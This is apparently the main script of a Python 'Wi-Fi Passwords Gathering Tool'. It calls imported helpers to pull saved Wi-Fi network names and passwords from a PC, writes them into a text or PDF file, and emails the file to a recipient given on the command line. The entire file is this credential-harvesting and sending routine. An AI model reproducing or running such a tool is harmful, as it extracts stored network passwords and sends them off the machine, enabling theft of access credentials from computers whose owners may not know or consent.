import cmd_args_setup as cmd
import wifi_info as wifi
import generate_pdf as pdf
import generate_txt as txt
import send_email as mail


subject = 'PC WI-FI Profiles Info'
body = '''Hello,
    Here is the PC wi-fi SSID & Passwords attached file.
    '''
sender, password, receiver, filename = cmd.cmd_setup()


def _data_():
    print('\n PC Wi-Fi Passwords Gathering Tool\n ---------------------------------')
    print('\n --> Getting Wi-Fi SSID')
    print('\n --> Getting Wi-Fi Passwords\n')
    data, SSID, passwords, easy_access, profile_errors = wifi.wifi_info()
    data = list(data)
    print('\n--> Creating {} File'.format(filename))
    print('\n--> Sending {} file to {}\n'.format(filename, receiver))
    return data, SSID, passwords, easy_access, profile_errors


def main():

    if filename.endswith('.txt'):
        data, SSID, passwords, easy_access, profile_errors = _data_()
        txt.generate_txt(filename, data, SSID, passwords,
                         easy_access, profile_errors)
        mail.send_mail(sender, password, receiver, subject, body, filename)

    elif filename.endswith('.pdf'):
        data, SSID, passwords, easy_access, profile_errors = _data_()
        pdf.generate_pdf(filename, data, SSID, passwords,
                         easy_access, profile_errors)
        mail.send_mail(sender, password, receiver, subject, body, filename)

    else:
        print('\n --> ' + filename + ' is not accepted')
        print('\n --> file extension should be .txt (or) .pdf')
        exit()


if __name__ == '__main__':
    main()
